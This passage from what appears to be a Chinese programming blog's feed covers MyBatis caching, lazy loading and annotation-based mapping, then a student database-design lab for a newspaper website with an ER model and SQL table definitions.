Sex = sex;    &#125;    public Date getBirthday() &#123;        return Birthday;    &#125;    public void setBirthday(Date birthday) &#123;        Birthday = birthday;    &#125;    @Override    public String toString() &#123;        return &quot;User&#123;&quot; +                &quot;Id=&quot; + Id +                &quot;, username=&#39;&quot; + username + &#39;\&#39;&#39; +                &quot;, Address=&#39;&quot; + Address + &#39;\&#39;&#39; +                &quot;, Sex=&#39;&quot; + Sex + &#39;\&#39;&#39; +                &quot;, Birthday=&quot; + Birthday +                &#39;&#125;&#39;;    &#125;&#125;</code></pre><p>2、用户（User）和账户（Account）持久层接口的方法：</p><pre><code class="java">    /**     * 查询所有用户     *     * @return     */    List&lt;User&gt; findAll();    /**     * 根据用户 id 查询账户信息     * @param uid     * @return     */    List&lt;User&gt; findByUid(Integer uid);</code></pre><p>3、编写用户持久层映射配置：</p><pre><code class="xml">&lt;resultMap type=&quot;user&quot; id=&quot;userMap&quot;&gt;        &lt;id column=&quot;id&quot; property=&quot;id&quot;&gt;&lt;/id&gt;        &lt;result column=&quot;username&quot; property=&quot;username&quot;/&gt;        &lt;result column=&quot;address&quot; property=&quot;address&quot;/&gt;        &lt;result column=&quot;sex&quot; property=&quot;sex&quot;/&gt;        &lt;result column=&quot;birthday&quot; property=&quot;birthday&quot;/&gt;        &lt;!-- collection 是用于建立一对多中集合属性的对应关系         ofType 用于指定集合元素的数据类型        --&gt;        &lt;collection property=&quot;accounts&quot; ofType=&quot;account&quot;                    select=&quot;com.itheima.dao.IAccountDao.findByUid&quot;                    column=&quot;id&quot;&gt;        &lt;/collection&gt;    &lt;/resultMap&gt;    &lt;!--查询所有--&gt;    &lt;select id=&quot;findAll&quot; resultMap=&quot;userMap&quot;&gt;        select * from user    &lt;/select&gt;</code></pre><p><code>&lt;collection&gt;</code>标签：</p><ul><li>主要用于加载关联的集合对象</li></ul><p>select 属性：</p><ul><li>用于指定查询 account 列表的 sql 语句，所以填写的是该 sql 映射的 id</li></ul><p>column 属性：</p><ul><li>用于指定 select 属性的 sql 语句的参数来源，上面的参数来自于 user 的 id 列，所以就写成 id 这一个字段名了</li></ul><p>4、编写账户持久层映射配置：</p><pre><code class="xml">    &lt;!-- 根据用户 id 查询账户信息 --&gt;    &lt;select id=&quot;findByUid&quot; resultType=&quot;account&quot; parameterType=&quot;int&quot;&gt;        select * from account where uid = #&#123;uid&#125;    &lt;/select&gt;</code></pre><p>5、延时加载 测试只加载用户信息：</p><pre><code class="java"> @Test    public void testFindAll() &#123;        List&lt;User&gt; users = userDao.findAll();      /*  for (User user : users) &#123;            System.out.println(&quot;用户的信息：&quot;);            System.out.println(user);            System.out.println(user.getAccounts());        &#125;*/    &#125;</code></pre><p>测试结果：</p><p><img src="http://img-blog.csdnimg.cn/20201116233927533.png#pic_center" alt="在这里插入图片描述"></p><p>可以发现并没有加载 Account 账户信息。</p><h4 id="十二、-Mybatis-缓存"><a href="#十二、-Mybatis-缓存" class="headerlink" title="十二、 Mybatis 缓存"></a>十二、 Mybatis 缓存</h4><p>像大多数的持久化框架一样，Mybatis 也提供了缓存策略，通过缓存策略来减少数据库的查询次数，从而提高性能。</p><p>Mybatis 中缓存分为一级缓存，二级缓存。</p><p><img src="http://img-blog.csdnimg.cn/20201117191943967.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><strong>1、Mybatis 一级缓存</strong>：</p><p>一级缓存是 SqlSession 级别的缓存，只要 SqlSession 没有 flush 或 close，它就存在。</p><p>验证一级缓存的存在：</p><p>测试方法：</p><pre><code class="java">  @Test    public void testFirstCache() &#123;        User user1 = userDao.findById(41);        System.out.println(user1);        User user2 = userDao.findById(41);        System.out.println(user2);        System.out.println(user1 == user2);    &#125;</code></pre><p>测试结果：</p><p><img src="http://img-blog.csdnimg.cn/20201117200149170.png" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20201117200201555.png" alt="在这里插入图片描述"><br>可以发现，虽然在上面的代码中查询了两次，但最后只执行了一次数据库操作，这就是 Mybatis 提供给我们的一级缓存在起作用了。因为一级缓存的存在，导致第二次查询 id 为 41 的记录时，并没有发出 sql 语句从数据库中查询数据，而是从一级缓存中查询。</p><p>测试一级缓存的清空：</p><p>测试方法：</p><pre><code class="java"> @Test    public void testFirstCache() &#123;        User user1 = userDao.findById(41);        System.out.println(user1);        // sqlSession.close();        //再次获取 SqlSession 对象        // sqlSession = factory.openSession();        //userDao = sqlSession.getMapper(IUserDao.class);        sqlSession.clearCache();//此方法也可以清空缓存        User user2 = userDao.findById(41);        System.out.println(user2);        System.out.println(user1 == user2);    &#125;</code></pre><p>测试结果：</p><p><img src="http://img-blog.csdnimg.cn/20201117200804977.png" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20201117200834562.png" alt="在这里插入图片描述"></p><p>当执行  sqlSession.clearCache() 后，再次获取sqlSession并查询id=41的User对象时，又重新执行了sql语句，从数据库进行了查询操作。</p><p><strong>一级缓存的分析</strong>：</p><p>一级缓存是 SqlSession 范围的缓存，当调用 SqlSession 的修改，添加，删除，commit()，close()方法时，就会清空一级缓存。</p><p><img src="http://img-blog.csdnimg.cn/20201117201409802.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>当第一次发起查询用户 id 为 1 的用户信息，先去找缓存中是否有 id 为 1 的用户信息，如果没有，从数据库查询用户信息。</p><p>得到用户信息，将用户信息存储到一级缓存中。</p><p>如果 sqlSession 去执行 commit 操作（执行插入、更新、删除），清空 SqlSession 中的一级缓存，这样做的目的为了让缓存中存储的是最新的信息，避免脏读。</p><p>第二次发起查询用户 id 为 1 的用户信息，先去找缓存中是否有 id 为 1 的用户信息（此时已经没有一级缓存了），如果缓存中有，则直接从缓存中获取用户信息，没有则重新发起查询。</p><p><strong>2、Mybatis 二级缓存</strong>：</p><p>它是 Mybatis 中 SqlSessionFactory 对象的缓存。由同一个 SqlSessionFactory 对象创建的 SqlSession 共享其缓存。</p><p><img src="http://img-blog.csdnimg.cn/20201117202533218.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>假设：</p><p>sqlSession1 去查询用户信息，查询到用户信息会将查询数据存储到二级缓存中。</p><p>如果 SqlSession3 去执行相同 mapper 映射下 sql，执行 commit 提交，将会清空该 mapper 映射下的二级缓存区域的数据。</p><p>sqlSession2 去查询与 sqlSession1 相同的用户信息，首先会去缓存中找是否存在数据，如果存在直接从缓存中取出数据,，否则重新发起查询（本例）。</p><p><strong>二级缓存的使用步骤</strong>：</p><p>1、让Mybatis框架支持二级缓存（在SqlMapConfig.xml中配置）：</p><pre><code class="xml">&lt;settings&gt;    &lt;!-- 开启二级缓存的支持 --&gt;    &lt;setting name=&quot;cacheEnabled&quot; value=&quot;true&quot;/&gt;&lt;/settings&gt;</code></pre><p>因为 cacheEnabled 的取值默认就为 true，所以这一步可以省略不配置。</p><p>true 代表开启二级缓存；为false 代表不开启二级缓存。</p><p>2、让当前的映射文件支持二级缓存（在IUserDao.xml中配置）：</p><pre><code class="xml">    &lt;!-- 开启二级缓存的支持 --&gt;    &lt;cache/&gt;</code></pre><p>3、让当前的操作支持二级缓存（在select标签中配置）：</p><pre><code class="xml">&lt;!-- 根据 id 查询 --&gt;&lt;select id=&quot;findById&quot; resultType=&quot;user&quot; parameterType=&quot;int&quot; useCache=&quot;true&quot;&gt;    select * from user where id = #&#123;uid&#125;&lt;/select&gt;</code></pre><p>将 IUserDao.xml 映射文件中的<code>&lt;select&gt;</code>标签中设置 useCache=” true “ 代表当前这个 statement 要使用二级缓存，如果不使用二级缓存可以设置为 false。</p><p>注意：针对每次查询都需要最新的数据 sql，要设置成 useCache=false，禁用二级缓存。</p><p>测试：</p><pre><code class="java"> @Test public void testFirstLevelCache()&#123;     SqlSession sqlSession1 = factory.openSession();     IUserDao dao1 = sqlSession1.getMapper(IUserDao.class);     User user1 = dao1.findById(41);     System.out.println(user1);     sqlSession1.close();//一级缓存消失     SqlSession sqlSession2 = factory.openSession();     IUserDao dao2 = sqlSession2.getMapper(IUserDao.class);     User user2 = dao2.findById(41);     System.out.println(user2);     sqlSession2.close();     System.out.println(user1 == user2); &#125;</code></pre><p>运行结果：</p><p><img src="http://img-blog.csdnimg.cn/20201117203958859.png" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/2020111720403564.png" alt="在这里插入图片描述"><br>经过上面的测试，发现执行了两次查询，并且在执行第一次查询后，我们关闭了一级缓存，再去执行第二次查询时，我们发现并没有对数据库发出 sql 语句，所以此时的数据就只能是来自于我们所说的二级缓存。</p><p>user1 = user2 = false 的原因是 二级缓存存放的是 <strong>数据</strong> 而不是对象，每次查询都会创建一个新的对象。 </p><h4 id="十三、-Mybatis-注解开发"><a href="#十三、-Mybatis-注解开发" class="headerlink" title="十三、 Mybatis 注解开发"></a>十三、 Mybatis 注解开发</h4><p><strong>1、mybatis 的常用注解</strong>：</p><pre><code class="sql">@Insert: 实现新增@Update: 实现更新@Delete: 实现删除@Select: 实现查询@Result: 实现结果集封装@Results: 可以与@Result 一起使用，封装多个结果集@ResultMap: 实现引用@Results 定义的封装@One: 实现一对一结果集封装@Many: 实现一对多结果集封装@SelectProvider: 实现动态 SQL 映射@CacheNamespace: 实现注解二级缓存的使用</code></pre><p><strong>2、使用 Mybatis 注解实现基本 CRUD</strong>：</p><p>1、实体类：</p><pre><code class="java">public class User implements Serializable &#123;    private Integer id;    private String username;    private String address;    private String sex;    private Date birthday;    public Integer getId() &#123;        return id;    &#125;    public void setId(Integer id) &#123;        this.id = id;    &#125;    public String getUsername() &#123;        return username;    &#125;    public void setUsername(String username) &#123;        this.username = username;    &#125;    public String getAddress() &#123;        return address;    &#125;    public void setAddress(String address) &#123;        this.address = address;    &#125;    public String getSex() &#123;        return sex;    &#125;    public void setSex(String sex) &#123;        this.sex = sex;    &#125;    public Date getBirthday() &#123;        return birthday;    &#125;    public void setBirthday(Date birthday) &#123;        this.birthday = birthday;    &#125;    @Override    public String toString() &#123;        return &quot;User&#123;&quot; +                &quot;id=&quot; + id +                &quot;, username=&#39;&quot; + username + &#39;\&#39;&#39; +                &quot;, address=&#39;&quot; + address + &#39;\&#39;&#39; +                &quot;, sex=&#39;&quot; + sex + &#39;\&#39;&#39; +                &quot;, birthday=&quot; + birthday +                &#39;&#125;&#39;;    &#125;&#125;</code></pre><p>2、使用注解方式开发持久层接口：</p><pre><code class="java">public interface IUserDao &#123;    /**     * 查询所有     * @return     */    @Select(&quot;select * from user&quot;)    List&lt;User&gt; findAll();    /**     * 根据 id 查询一个用户     * @param userId     * @return     */    @Select(&quot;select * from user where id = #&#123;uid&#125; &quot;)    User findById(Integer userId);    /**     * 插入操作     * @param user     * @return     */    @Insert(&quot;insert into user(username,sex,birthday,address)values(#&#123;username&#125;,#&#123;sex&#125;,#&#123;birthday&#125;,#&#123;address&#125;)&quot;)    int saveUser(User user);    /**     * 更新操作     * @param user     * @return     */    @Update(&quot;update user set username=#&#123;username&#125;, address =#&#123;address&#125;, sex =#&#123;sex&#125;, birthday =#&#123;birthday&#125;where id =#&#123;id&#125;&quot;)    int updateUser(User user);    /**     * 删除用户     * @param userId     * @return     */    @Delete(&quot;delete from user where id = #&#123;uid&#125; &quot;)    int deleteUser(Integer userId);    /**     * 查询使用聚合函数     * @return     */    @Select(&quot;select count(*) from user &quot;)    int findTotal();    /**     * 模糊查询     * @param name     * @return     */    @Select(&quot;select * from user where username like #&#123;username&#125; &quot;)    List&lt;User&gt; findByName(String name);&#125;</code></pre><p>3、SqlMapConfig 配置文件：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE configuration        PUBLIC &quot;-//mybatis.org//DTD Config 3.0//EN&quot;        &quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;&gt;&lt;configuration&gt;    &lt;!--引入外部文件--&gt;    &lt;properties resource=&quot;jdbcConfig.properties&quot;/&gt;    &lt;!--配置别名--&gt;    &lt;typeAliases&gt;        &lt;package name=&quot;com.smk.domain&quot;/&gt;    &lt;/typeAliases&gt;    &lt;environments default=&quot;mysql&quot;&gt;        &lt;environment id=&quot;mysql&quot;&gt;            &lt;transactionManager type=&quot;JDBC&quot;&gt;&lt;/transactionManager&gt;            &lt;dataSource type=&quot;POOLED&quot;&gt;                &lt;property name=&quot;driver&quot; value=&quot;$&#123;jdbc.driver&#125;&quot;/&gt;                &lt;property name=&quot;url&quot; value=&quot;$&#123;jdbc.url&#125;&quot;/&gt;                &lt;property name=&quot;username&quot; value=&quot;$&#123;jdbc.username&#125;&quot;/&gt;                &lt;property name=&quot;password&quot; value=&quot;$&#123;jdbc.password&#125;&quot;/&gt;            &lt;/dataSource&gt;        &lt;/environment&gt;    &lt;/environments&gt;    &lt;!-- 配置 dao 接口的位置，它有两种方式    第一种：使用 mapper 标签配置 class 属性    第二种：使用 package 标签，直接指定 dao 接口所在的包    --&gt;    &lt;mappers&gt;        &lt;package name=&quot;com.smk.dao&quot;/&gt;    &lt;/mappers&gt;&lt;/configuration&gt;</code></pre><p>4、测试方法：</p><p>测试方法和xml映射配置开发是一样的。</p><p><strong>3、使用注解实现复杂关系映射开发</strong>：</p><p>实现复杂关系映射之前，可以在映射文件中通过配置 <code>&lt;resultMap&gt;</code> 来实现，在使用注解开发时我们需要借助<code>@Results</code> 注解，<code>@Result</code> 注解，<code>@One</code> 注解，<code>@Many</code> 注解。</p><p><strong>3.1、当POJO属性和数据库字段不一致时</strong>：</p><p>例：<br>1、 实体类：</p><pre><code class="java">    private Integer userId;    private String userName;    private String userAddress;    private String userSex;    private Date userBirthday;</code></pre><p>2、dao接口：</p><pre><code class="java">public interface IUserDao &#123;    /**     * 查询所有     *     * @return     */    @Select(&quot;select * from user&quot;)    @Results(id = &quot;userMap&quot;, value = &#123;            @Result(id = true, column = &quot;id&quot;, property = &quot;userId&quot;),            @Result(column = &quot;username&quot;, property = &quot;userName&quot;),            @Result(column = &quot;address&quot;, property = &quot;userAddress&quot;),            @Result(column = &quot;sex&quot;, property = &quot;userSex&quot;),            @Result(column = &quot;birthday&quot;, property = &quot;userBirthday&quot;)    &#125;)    List&lt;User&gt; findAll();    /**     * 根据 id 查询用户     *     * @param userId     * @return     */    @Select(&quot;select * from user where id = #&#123;uid&#125; &quot;)    @ResultMap(&quot;userMap&quot;)    User findById(Integer userId);    /**     * 模糊查询     *     * @param name     * @return     */    @Select(&quot;select * from user where username like #&#123;username&#125;&quot;)    @ResultMap(&quot;userMap&quot;)    List&lt;User&gt; findByName(String name);&#125;</code></pre><p>其中：</p><p>@Results 注解代替的是标签<code>&lt;resultMap&gt;</code></p><p>@Resutl 注解代替了 <code>&lt;id&gt;</code>标签和<code>&lt;result&gt;</code>标签</p><p>@Result 中 属性介绍：</p><ul><li>id 是否是主键字段</li><li>column 数据库的列名</li><li>property 需要装配的属性名</li></ul><p>@Result定义后，在其他方法处，便可以使用该@Results定义的resultMap了。</p><p><strong>3.2、使用注解实现一对一复杂关系映射</strong>：</p><p>1、User 实体类及 Account 实体类：</p><p>和上面xml配置方式相同。</p><p>2、账户的持久层接口及注解配置：</p><pre><code class="java">public interface IAccountDao &#123;    @Select(&quot;select * from account&quot;)    @Results(id = &quot;accountMap&quot;, value = &#123;            @Result(id = true, column = &quot;id&quot;, property = &quot;id&quot;),            @Result(column = &quot;uid&quot;, property = &quot;uid&quot;),            @Result(column = &quot;money&quot;, property = &quot;money&quot;),            @Result(property = &quot;user&quot;, column = &quot;uid&quot;, one = @One(select = &quot;com.smk.dao.IUserDao.findById&quot;, fetchType = FetchType.EAGER))    &#125;)    List&lt;Account&gt; findAll();&#125;</code></pre><p>@One 注解（一对一）：</p><ul><li>代替了<code>&lt;assocation&gt;</code>标签，是多表查询的关键，在注解中用来指定子查询返回单一对象。</li></ul><p>@One 注解属性介绍：</p><ul><li>select 指定用来多表查询的 sqlmapper</li><li>fetchType 会覆盖全局的配置参数 lazyLoadingEnabled。。</li></ul><p>使用格式：</p><ul><li>@Result(column=””,property=””,one=@One(select=””))</li></ul><p>3、用户的持久层接口及注解配置：</p><pre><code class="java">public interface IUserDao &#123;    /**     * 查询所有     *     * @return     */    @Select(&quot;select * from user&quot;)    @Results(id = &quot;userMap&quot;, value = &#123;            @Result(id = true, column = &quot;id&quot;, property = &quot;userId&quot;),            @Result(column = &quot;username&quot;, property = &quot;userName&quot;),            @Result(column = &quot;address&quot;, property = &quot;userAddress&quot;),            @Result(column = &quot;sex&quot;, property = &quot;userSex&quot;),            @Result(column = &quot;birthday&quot;, property = &quot;userBirthday&quot;)    &#125;)    List&lt;User&gt; findAll();    /**     * 根据 id 查询用户     *     * @param userId     * @return     */    @Select(&quot;select * from user where id = #&#123;uid&#125; &quot;)    @ResultMap(&quot;userMap&quot;)    User findById(Integer userId);&#125;</code></pre><p>运行结果：</p><p><img src="http://img-blog.csdnimg.cn/20201126001548593.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><strong>3.3、使用注解实现一对多复杂关系映射</strong>：</p><p>1、User 实体类及 Account 实体类：</p><ul><li>和上面xml配置方式相同。</li></ul><p>2、用户的持久层接口及注解配置：</p><pre><code class="java">public interface IUserDao &#123;    /**     * 查询所有     *     * @return     */    @Select(&quot;select * from user&quot;)    @Results(id = &quot;userMap&quot;, value = &#123;            @Result(id = true, column = &quot;id&quot;, property = &quot;userId&quot;),            @Result(column = &quot;username&quot;, property = &quot;userName&quot;),            @Result(column = &quot;address&quot;, property = &quot;userAddress&quot;),            @Result(column = &quot;sex&quot;, property = &quot;userSex&quot;),            @Result(column = &quot;birthday&quot;, property = &quot;userBirthday&quot;),            @Result(property = &quot;accounts&quot;, column = &quot;id&quot;, many = @Many(                    select = &quot;com.smk.dao.IAccountDao.findByUid&quot;,                    fetchType = FetchType.LAZY))    &#125;)    List&lt;User&gt; findAll();&#125;</code></pre><p>3、账户的持久层接口及注解配置：</p><pre><code class="java">public interface IAccountDao &#123;    // 根据用户 id 查询用户下的所有账户    @Select(&quot;select * from account where uid = #&#123;uid&#125; &quot;)    List&lt;Account&gt; findByUid(Integer userId);&#125;</code></pre><p>4、添加测试方法：</p><pre><code class="java">    //测试查询所有    @Test    public void testFindAll() &#123;        List&lt;User&gt; users = userDao.findAll();        for (User user : users) &#123;            System.out.println(&quot;-----每个用户的内容-----&quot;);            System.out.println(user);            System.out.println(user.getAccounts());        &#125;    &#125;</code></pre><p>运行结果：</p><p><img src="http://img-blog.csdnimg.cn/20201126152434428.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>测试延时加载：</p><pre><code class="java"> @Test    public void testFindAll() &#123;        List&lt;User&gt; users = userDao.findAll();       /* for (User user : users) &#123;            System.out.println(&quot;-----每个用户的内容-----&quot;);            System.out.println(user);            System.out.println(user.getAccounts());        &#125;*/    &#125;</code></pre><p>运行结果：</p><p><img src="http://img-blog.csdnimg.cn/20201126160013905.png#pic_center" alt="在这里插入图片描述"></p><p><strong>3.4、mybatis 基于注解的二级缓存</strong>：</p><p>1、在 SqlMapConfig 中开启二级缓存支持：</p><pre><code class="xml">&lt;!-- 配置二级缓存 --&gt;&lt;settings&gt;    &lt;!-- 开启二级缓存的支持 --&gt;    &lt;setting name=&quot;cacheEnabled&quot; value=&quot;true&quot;/&gt;&lt;/settings&gt;</code></pre><p>2、在持久层接口中使用注解配置二级缓存：</p><pre><code class="java">@CacheNamespace(blocking=true)//mybatis 基于注解方式实现配置二级缓存public interface IUserDao &#123;&#125;</code></pre><hr><p>🆗，至此mybatis的内容就总结完了（￣︶￣）↗　</p>]]></content>
      
      
      <categories>
          
          <category> Web开发 </category>
          
          <category> JavaEE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mybatis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库系统（五）——数据库设计</title>
      <link href="2021/01/03/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%EF%BC%88%E4%BA%94%EF%BC%89%E2%80%94%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BE%E8%AE%A1/"/>
      <url>2021/01/03/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%EF%BC%88%E4%BA%94%EF%BC%89%E2%80%94%E2%80%94%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%BE%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h4 id="一、实验目的："><a href="#一、实验目的：" class="headerlink" title="一、实验目的："></a>一、实验目的：</h4><ol><li><p>熟悉数据库设计基本步骤；</p></li><li><p>练习数据库需求分析方法，并能给出数据字典；</p></li><li><p>练习 ER 图建模，掌握 ER 模型向关系模式的转化。</p></li></ol><h4 id="二、实验内容"><a href="#二、实验内容" class="headerlink" title="二、实验内容:"></a>二、实验内容:</h4><ol><li><p>从用户需求出发，按照数据库设计步骤，分别完成如下内容：概念结构设计（ER 模型），给出满足需求的最终全局 ER 图，要求模型尽量精简，消除不必要的冗余，并给出理由或说明；</p></li><li><p>逻辑结构设计（关系模式），把 ER 模型转换成适当的关系模式，并进行适当地规范化，设计相关完整性约束。</p></li></ol><h4 id="三、题目：Newspaper-DataBase-Design"><a href="#三、题目：Newspaper-DataBase-Design" class="headerlink" title="三、题目：Newspaper DataBase Design"></a>三、题目：Newspaper DataBase Design</h4><p>Newspaper System<br>报纸系统</p><p>A newspaper is setting up a website where people can write, read and comment on news stories. Your job is to design a database that can record the information needed for the website to work.<br>一家报纸正在建立一个网站，人们可以在那里撰写、阅读和评论新闻报道。你的工作是设计一个数据库，可以记录网站工作所需的信息。</p><p>The website lists a number of stories, each classified within one of about 10 sections (‘Local news’, ‘World news’,‘Opinion’, ‘Sport’, ‘Technology’ etc).<br>该网站列出了许多故事，每一个故事都被归入10个栏目(“本地新闻”、“世界新闻”、“观点”、“体育”、“科技”等)中的一个栏目里。</p><p>Each content of each story consists of a piece of text (the manager would prefer there to be no limit on the size) as well as a headline and a short “lede” (a lede is a sentence of 10 to 20 words that summarizes the story).<br>每个故事的每一个内容都由一段文字（经理希望没有大小限制）以及一个标题和一个简短的 “lede”（lede是一个10到20个单词的句子，用来总结故事）。</p><p>Each story is written by one or more of our authors, who submit the story to our database on a particular date.<br>每个故事都是由我们的一个或多个作者撰写的，他们在特定日期将故事提交到我们的数据库。</p><p>If a story is considered worthy, it is edited by one of our editors, assigned to a section, and then published on a particular date.<br>如果一个故事被认为是有价值的，它将由我们的一位编辑编辑，分配到一个部分，然后在一个特定的日期出版。</p><p>Authors and editors are staff members.<br>作者和编辑都是工作人员。</p><p>It is not possible to be both an author and an editor.<br>既当作家又当编辑是不可能的。</p><p>About each staff member we store their name and when they join (and later leave) the newspaper.<br>关于每一位员工，我们会保存他们的名字，以及他们何时加入(后来离开)报纸。</p><p>We want to organize the website so that readers can click on a section, or an author’s name, and see a list of all the relevant stories.<br>我们希望组织网站，这样读者可以点击某个部分或作者的名字，并看到所有相关故事的列表。</p><p>On the main page we list each story’s title (shown as a headline) and lede.<br>在主页上，我们列出每个故事的标题(作为标题显示)和lede。</p><p>Then if the reader clicks on the headline, we display the entire story.<br>然后，如果读者点击标题，我们就会显示整个故事。</p><p>Our readers, if they wish, can choose to register themselves in our database, recording a username and password (they do not need to record their real name).<br>我们的读者，如果他们愿意，可以选择在我们的数据库中注册，记录用户名和密码(他们不需要记录他们的真实姓名)。</p><p>Readers who register can then comment on stories, and on other readers’ comments.<br>注册的读者可以对故事和其他读者的评论进行评论。</p><p>They can also click “Like” on a story – and if they change their mind later, they can “Unlike” it.<br>他们还可以点击某个故事的“喜欢”按钮——如果他们后来改变了主意，他们可以“不喜欢”这个故事。</p><p>When we display a story we show the number of Likes the story has received and list out the comments below it.<br>当我们显示一个故事时，我们会显示这个故事收到的赞数，并在下面列出评论。</p><p>With each comment we show the username of the person who commented, and the time they commented.<br>在每条评论中，我们都会显示评论人的用户名以及他们评论的时间。</p><p>We aim for brevity in comments, and restrict them to 1024 characters.<br>我们的目标是在评论中保持简洁，限制在1024个字符以内。</p><h4 id="四、ER图："><a href="#四、ER图：" class="headerlink" title="四、ER图："></a>四、ER图：</h4><p>根据题意，画出 ER图：<br><img src="https://img-blog.csdnimg.cn/20201213183916912.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>其中关系模式如下：</p><ul><li>员工（姓名，加入日期，离开日期）</li><li>新闻（标题，文本，简介）</li><li>读者（用户名，密码）</li><li>提交（提交日期，员工姓名，新闻）</li><li>分类（栏目，新闻）</li><li>评论（评论时间，新闻，读者用户名）</li><li>评论评论（评论时间，评论，读者用户名）</li><li>点赞（新闻，读者）</li></ul><p>每个关系模式的主码、外码如下：</p><ul><li>员工（主码是姓名，无外码）</li><li>新闻（主码是标题和文本，无外码）</li><li>读者（主码是用户名，无外码）</li><li>提交（主码是员工的姓名和新闻，外码是员工的姓名）</li><li>分类（主码是栏目和新闻，无外码）</li><li>评论（主码是新闻和读者用户名，外码是读者用户名）</li><li>评论评论（主码是评论和读者用户名，外码是读者用户名）</li><li>点赞（主码是新闻和读者用户名，外码是读者用户名）</li></ul><h4 id="五、数据库实体关系设计："><a href="#五、数据库实体关系设计：" class="headerlink" title="五、数据库实体关系设计："></a>五、数据库实体关系设计：</h4><pre><code class="sql">create table staff(Name varchar(10) primary key,Join_date date,Leave_date date);create table story(Headline VARCHAR(10),Text varchar(100),Lede varchar(50),primary key(Headline,Text));create table reader(Username varchar(20) primary key,Password varchar(20));create table submit(Submit_date date,Name VARCHAR(5),Headline VARCHAR(10),primary key (Name,Headline),foreign key (Name) references staff(Name));create table class(Section varchar(5),Headline VARCHAR(10),primary key (Section,Headline));create table comment(Comtime date,Headline VARCHAR(10),Name varchar(10),primary key (Headline,Name),foreign key(Name) references staff(Name));create table comment_comment(Comtime date,Comment varchar(50),Name varchar(10),primary key (Comment,Name),foreign key(Name) references staff(Name));create table praise(Headline VARCHAR(10),Name varchar(10),primary key (Headline,Name),foreign key(Name) references staff(Name));</code></pre><p>设计好的数据库模型如下：</p><p><img src="https://img-blog.csdnimg.cn/20201213200440946.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="六、实验小结："><a href="#六、实验小结：" class="headerlink" title="六、实验小结："></a>六、实验小结：</h4><p>应用数据库设计的范式理论对初始关系模型进行优化。数据库设计的三大范式如下：</p><ul><li><p>第一范式：每一个分类必须是一个不可分的数据项。属性不可再分，确保每列的原子性。</p></li><li><p>第二范式：要求每个表只描述一件事情，每条记录有唯一标识列。</p></li><li><p>第三范式：数据库表中不包含已在其它表中已包含的非主关键字信息。</p></li></ul><p>参考文章：<a href="https://blog.csdn.net/COCO56/article/details/103470262">https://blog.csdn.net/COCO56/article/details/103470262</a></p>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库系统（四）——触发器</title>
      <link href="2021/01/03/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%EF%BC%88%E5%9B%9B%EF%BC%89%E2%80%94%E2%80%94%E8%A7%A6%E5%8F%91%E5%99%A8/"/>
      <url>2021/01/03/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%EF%BC%88%E5%9B%9B%EF%BC%89%E2%80%94%E2%80%94%E8%A7%A6%E5%8F%91%E5%99%A8/</url>
      
